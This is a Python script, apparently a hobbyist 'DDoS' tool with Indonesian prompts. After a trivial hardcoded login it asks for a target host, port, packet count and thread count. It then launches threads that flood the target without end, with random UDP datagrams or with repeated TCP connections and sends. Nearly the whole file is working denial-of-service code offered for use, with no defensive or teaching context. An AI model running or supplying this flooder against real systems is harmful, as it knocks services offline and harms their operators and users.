#!/usr/bin/env python3
#REMAKE BY Xrian
#TOOLS BUILD 26/10/2021
#V3
import random
import socket
import threading
import sys
import os
import signal
import time
from os import system, name


print("""
\033[91m 
██████╗░██╗░█████╗░███╗░░██╗
██╔══██╗██║██╔══██╗████╗░██║
██████╔╝██║███████║██╔██╗██║
██╔══██╗██║██╔══██║██║╚████║
██║░░██║██║██║░░██║██║░╚███║
╚═╝░░╚═╝╚═╝╚═╝░░╚═╝╚═╝░░╚══╝
""")

#Login

user ="XrianX"

for i in range(3):
	pwd = input("\033[93m> Masukan User : ")
	j=3
	if(pwd==user):
		time.sleep(5)
		break
	else:
		time.sleep(5)
		print("\033[91m> User Nya Salah")
		continue
time.sleep(5)
print("\033[94m> Nah Bener")

password ="f"

for i in range(3):
	pwd = input("\033[93m> Masukan Password : ")
	j=3
	if(pwd==password):
		time.sleep(5)
		print("\033[92mBerak Dulu Om")
		break
	else:
		time.sleep(5)
		print("\033[91m> Password Salah")
		continue
time.sleep(5)
print("\033[94m> Password Benar")

# Script


os.system("clear")
print("""
\033[91m

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░
""")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" YAKEN DDOS?(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Xrian Attack From Server!!!")
		except:
			print("[!] Down!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" Xrian Attack From Server!!!")
		except:
			s.close()
			print("[*] Down!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()